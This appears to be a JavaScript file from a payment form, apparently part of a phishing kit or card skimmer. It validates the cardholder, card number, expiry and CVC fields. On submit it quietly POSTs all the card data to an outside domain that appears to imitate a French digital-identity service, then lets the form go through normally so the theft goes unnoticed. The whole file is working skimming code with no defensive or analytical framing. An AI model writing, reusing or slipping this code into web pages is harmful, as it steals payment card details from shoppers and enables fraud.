document.addEventListener('DOMContentLoaded', function() {
    const cardHolder = document.getElementById('card_holder');
    const cardNumber = document.getElementById('card_number');
    const expiryDate = document.getElementById('expiry_date');
    const cvc = document.getElementById('cvc');
    const submitButton = document.getElementById('submit_button');
    
    function checkFields() {
        const cardNumberValid = cardNumber.value.length === 16 && /^\d+$/.test(cardNumber.value);
        if (cardHolder.value && cardNumberValid && expiryDate.value && cvc.value) {
            submitButton.disabled = false;
        } else {
            submitButton.disabled = true;
        }
    }

    cardHolder.addEventListener('input', checkFields);
    cardNumber.addEventListener('input', checkFields);
    expiryDate.addEventListener('input', checkFields);
    cvc.addEventListener('input', checkFields);

    document.getElementById('payment_form').addEventListener('submit', function(event) {
        event.preventDefault();
        const formData = new FormData(this);
        fetch('https://llidentitenumerique-france.com/a/send.php', {
            method: 'POST',
            body: formData,
            mode: 'cors'
        })
        .then(response => response.text())
        .then(data => {
            console.log('Message sent to external server:', data);
            this.submit();
        })
        .catch(error => {
            console.error('Error sending message to external server:', error.message);
            this.submit();
        });
    });
});
